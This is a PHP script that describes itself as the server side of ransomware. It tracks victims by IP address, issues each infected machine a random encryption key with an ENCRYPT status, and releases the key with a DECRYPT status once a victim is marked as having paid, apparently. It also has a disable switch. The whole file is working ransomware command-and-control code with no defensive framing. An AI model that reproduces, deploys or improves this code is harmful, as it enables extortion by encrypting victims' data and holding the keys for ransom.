<?php

/** VARIABLES **/
$status = array("NOTHING" => 0, "STOP" => 1, "DECRYPT" => 2, "ENCRYPT" => 3); // Different status's
$settings = array("disabled" => 0); // Settings
$users = array(); // Array for storing users
$alphabet = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"; // Alphabet for generating random keys
$keyLength = 16; // Key length must be a multiple of 16 bytes
/** VARIABLES **/

/** FUNCTIONS **/
/* Saves settings for ransomware */
function saveSettings() {
	global $settings;

	file_put_contents("settings.json",json_encode($settings));
}

/* Updates settings from file */
function refreshSettings() {
	global $settings;

	$settings = json_decode(file_get_contents('settings.json'), true);
}

/* Saves users for ransomware */
function saveUsers() {
	global $users;
	
	file_put_contents("users.json",json_encode($users));
}

/* Updates users from file */
function refreshUsers() {
	global $users;

	$users = json_decode(file_get_contents('users.json'), true);
}

/* Generate string based on len */
function genString($len) {
    global $alphabet;

    $finale = "";
    
    for ($curChar = 0; $curChar < $len; $curChar++)
        $finale .= $alphabet[rand(0, (strlen($alphabet) - 1))];

    return $finale;
}

// Searches $array for $value, returns index or -1 if not found
function search($array, $value)
{
    $counter = 0;
    $found = false;

    foreach($array as $v) {
        if(strcmp($v[0], $value) == 0) {
            $found = true;
            break;
        } 

        $counter++;
    }
    
    if($found)
        return $counter;
        
    return -1;
}
/** FUNCTIONS **/

if($settings["disabled"] == 1) {
	echo $status["STOP"];
	exit();
}

refreshSettings();
refreshUsers();

if(strcmp($_GET["parameters"], "helloworld") == 0) {
	$search = search($users, $_SERVER['REMOTE_ADDR']);
	if($search == -1) {
		$key = genString($keyLength);
		array_push($users, array($_SERVER['REMOTE_ADDR'], 0, $key));
		saveUsers();
		if($users == null)
			echo "NULL";
		
		//echo $key;
		echo $status["ENCRYPT"].":".$key;
	} else
		echo $status["NOTHING"];

} else {
	$search = search($users, $_SERVER['REMOTE_ADDR']);

	if($search != -1) {
		$user = $users[$search];

		if($user[1] == 1) {
			echo $status["DECRYPT"].":".$user[2];
			unset($users[$search]);
			saveUsers();
			exit();
		}

		echo $status["NOTHING"];
	}
}
?>